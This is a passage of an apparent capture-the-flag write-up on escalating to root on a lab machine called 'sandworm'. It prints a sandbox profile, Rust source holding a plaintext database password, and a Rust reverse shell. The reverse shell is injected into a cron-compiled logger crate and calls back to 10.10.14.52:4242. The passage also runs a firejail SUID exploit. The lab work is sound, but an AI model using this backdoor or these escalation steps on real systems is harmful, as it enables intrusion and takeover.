            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

And that's also his unix password
```bash
silentobserver@sandworm:~$
silentobserver@sandworm:~$
silentobserver@sandworm:~$
silentobserver@sandworm:~$
silentobserver@sandworm:~$ wc -c user.txt
33 user.txt
```

## Privesc
```bash
silentobserver@sandworm:~$ sudo -l
[sudo] password for silentobserver:
Sorry, user silentobserver may not run sudo on localhost.
```
```bash
silentobserver@sandworm:~$ groups
silentobserver
silentobserver@sandworm:~$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

The webapp wasn't in a container but it looks like it was in a jail of some sort
```bash
silentobserver@sandworm:/home/atlas/.config/firejail$ cat webapp.profile
noblacklist /var/run/mysqld/mysqld.sock

hostname sandworm
seccomp

noroot
allusers

caps.drop dac_override,fowner,setuid,setgid
seccomp.drop chmod,fchmod,setuid

private-tmp
private-opt none
private-dev
private-bin /usr/bin/python3,/usr/local/bin/gpg,/bin/bash,/usr/bin/flask,/usr/local/sbin/gpg,/usr/bin/groups,/usr/bin/base64,/usr/bin/lesspipe,/usr/bin/basename,/usr/bin/filename,/usr/bin/bash,/bin/sh,/usr/bin/ls,/usr/bin/cat,/usr/bin/id,/usr/local/libexec/scdaemon,/usr/local/bin/gpg-agent

#blacklist ${HOME}/.ssh
#blacklist /opt

blacklist /home/silentobserver
whitelist /var/www/html/SSA
read-write /var/www/html/SSA/SSA/submissions

noexec /var/www/html/SSA/SSA/submissions
read-only ${HOME}
read-write ${HOME}/.gnupg
```

Looks like [that's](https://github.com/netblue30/firejail) what's going on  
```
2023/07/16 08:55:40 CMD: UID=1000 PID=1238   | /usr/local/bin/firejail --profile=webapp flask run
```
```bash
silentobserver@sandworm:~$ find / -perm -4000 -user root 2>/dev/null
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
```

```bash
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs
```
```rust
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;


// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("
             ,,
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm
P'   MM   `7               MMN.    M           MM
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM
     MM      MM   MM   ,AP M     YMM YM.    ,  MM
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo
                  MM
                .JMML.

");


    let mode = get_mode();

    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```
```bash
mysql -u tipnet -D Upstream -p
```
```bash
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
```
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

```
2023/07/16 10:28:01 CMD: UID=0    PID=5531   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
```

So this is ran by a cron job in `e` mode which is `pull` mode, `pull` mode calls `pull_indeces()` which in turn pulls the logger, and `silentobserver` has write access into the logger.  
So we just have to drop a [revshell](https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs) inside the logger:
```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};


fn backdoor() {
    let sock = TcpStream::connect("10.10.14.52:4242").unwrap();
    let fd = sock.as_raw_fd();

    Command::new("/bin/bash")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }

    backdoor()
}
```

And we get a callback as atlas, but outside the jail that the web-app was in.
```bash
atlas@sandworm:/opt/tipnet$ ls -la /usr/bin|wc -l
ls -la /usr/bin|wc -l
1214
```

We saw earlier that firejail has the SUID flag, and atlas has access to it through the jailer group
```bash
atlas@sandworm:/opt/tipnet$ ls -la /usr/local/bin/firejail
ls -la /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

And there is a SUID exploit for firejail: [Gist](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)  

```bash
atlas@sandworm:/dev/shm$ python3 exploit.py
You can now run 'firejail --join=2741' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```
```bash
atlas@sandworm:~$ firejail --join=2741
changing root to /proc/2741/root
Warning: cleaning all supplementary groups
Child process initialized in 22.15 ms
atlas@sandworm:~$ su -
root@sandworm:~#
root@sandworm:~#
root@sandworm:~#
```
